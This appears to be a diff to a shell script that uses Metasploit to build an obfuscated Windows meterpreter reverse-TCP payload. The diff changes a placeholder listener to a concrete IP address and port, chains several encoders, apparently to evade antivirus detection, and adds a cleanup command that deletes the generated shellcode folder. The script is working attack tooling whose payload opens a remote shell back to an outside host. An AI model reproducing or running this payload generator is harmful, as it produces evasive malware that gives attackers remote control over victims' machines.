@@ -1,8 +1,8 @@
 cd /usr/share/metasploit-framework/
-IP='00.000.000.0'
-port='4444'
+IP='76.182.55.45'
+port='31339'
 enumber='3'
-seed='40'
+seed='400'
 ./msfpayload windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port EXITFUNC=process R | ./msfencode -e x86/shikata_ga_nai -c $enumber -t raw | ./msfencode -e x86/jmp_call_additive -c $enumber -t raw | ./msfencode -e x86/call4_dword_xor -c $enumber -t raw |  ./msfencode -e x86/shikata_ga_nai -c $enumber  > test.c 
 mv test.c ShellCode
 cd ShellCode
@@ -40,3 +40,4 @@ sumx=`sha1sum $filex`
 echo $filex "...generated in ShellCode subfolder"
 echo $filex "sha1checksum is .." $sumx  
 strip --strip-debug $filex
+rm /usr/share/metasploit-framework/ShellCode/*
